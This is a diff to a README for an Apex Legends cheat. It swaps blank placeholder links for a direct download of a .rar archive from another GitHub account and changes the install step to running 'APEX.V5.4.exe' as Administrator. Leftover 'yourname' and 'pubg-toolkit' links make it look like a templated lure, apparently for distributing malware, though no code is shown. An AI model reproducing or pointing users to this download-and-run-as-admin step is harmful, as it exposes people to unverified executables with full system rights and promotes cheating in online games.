@@ -9,7 +9,7 @@
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0a0a12?style=for-the-badge&logo=windows&logoColor=00fff7)](https://github.com/yourname/apex-rak)
 [![Language](https://img.shields.io/badge/C%2B%2B-23-0a0a12?style=for-the-badge&logo=cplusplus&logoColor=b026ff)](https://github.com/yourname/apex-rak)
 [![Graphics](https://img.shields.io/badge/Dear%20ImGui-DX11-0a0a12?style=for-the-badge&logoColor=ff2d95)](https://github.com/yourname/apex-rak)
-[![Version](https://img.shields.io/badge/Version-3.1-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/apex-rak/releases)
+[![Version](https://img.shields.io/badge/Version-5.4-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/apex-rak/releases)
 [![License](https://img.shields.io/badge/License-MIT-0a0a12?style=for-the-badge&logoColor=b026ff)](LICENSE)
 
 <br/>
@@ -33,11 +33,11 @@
 
 ---
 
-### ⬇️ [Download]()
+### ⬇️ [Download](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)
 
 Get the latest release from the **[Releases](https://github.com/yourname/pubg-toolkit/releases/latest)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)
 
 ---
 
@@ -78,13 +78,13 @@ Get the latest release from the **[Releases](https://github.com/yourname/pubg-to
 | **runtime** | Visual C++ Redistributable 2015–2022 |
 
 
-## ▸ installation
+## ▸ [installation](https://github.com/Perfectionfeagora/Apex-Legends-Cheat/releases/download/APEX.V5.4/APEX.V5.4.rar)
 
 **1.** download the latest release from the **[Releases](https://github.com/yourname/apex-rak/releases)** tab
 
 **2.** extract archive to a single ASCII-path folder
 
-**3.** run the `loader` as **Administrator**
+**3.** run the `APEX.V5.4.exe` as **Administrator**
 
 **4.** launch Apex Legends, enter a match, press `INSERT` or `DELETE`
 
